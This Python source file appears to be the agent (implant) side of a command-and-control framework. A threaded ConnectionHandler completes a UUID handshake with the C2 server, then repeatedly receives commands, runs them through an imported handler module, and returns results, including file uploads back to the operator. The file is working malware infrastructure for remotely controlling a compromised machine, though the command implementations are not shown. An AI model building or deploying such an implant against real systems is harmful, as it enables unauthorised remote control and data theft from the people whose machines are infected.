from protocol.agent_protocol import *
from agent import agent_commands

import threading



class ConnectionHandler(threading.Thread):
    def __init__(self, client_socket, client_address, agent_uuid):
        super().__init__()
        self.agent_protocol = AgentProtocol(client_socket)
        self.client_address = client_address
        self.agent_uuid = agent_uuid
        self.running = True  # Control flag for the thread


    def run(self):
        """
        This method runs in the thread and handles agent communication.
        """
        print(f"[+] Incoming connection from {self.client_address}")

        try:
            if not self.agent_hello():
                raise Exception("[-] Agent hello failed")
            while self.running:
                self.wait_for_command()
        except Exception as e:
            print(f"[-] Error with {self.client_address}:\n\t{e}")
        finally:
            self.agent_protocol.client_socket.close()
            print(f"[-] Connection with {self.client_address} has been terminated.")

    def stop(self):
        """
        Stop the connection handler.
        """
        self.running = False
        self.agent_protocol.client_socket.close()

    def agent_hello(self):
        self.agent_protocol.agent_hello_send(self.agent_uuid)
        message_type, status, agent_uuid = self.agent_protocol.agent_hello_receive()
        if agent_uuid != self.agent_uuid:
            return False
        if message_type != MESSAGE_RESPONSE:
            return False
        if status != MESSAGE_STATUS_OK:
            print(f"[-] {agent_uuid} Received response {status} to agent hello request")
            return False

        return True

    def wait_for_command(self):
        print("[+] Waiting for incoming command from C2...")
        command_id, arguments = self.agent_protocol.receive_command_from_c2()

        try:
            command_status, command_response = agent_commands.handle_command(command_id, arguments)
        except Exception as e:
            print(f"[-] Error while running command handler for command {command_id}: {e}")
            command_status = MESSAGE_STATUS_ERROR
            command_response = str(e)

        if command_id == FILE_UPLOAD_COMMAND_ID:
            self.agent_protocol.send_file_upload_response(command_id, command_status, command_response, arguments)
        else:
            self.agent_protocol.send_command_response(command_id, command_status, command_response)

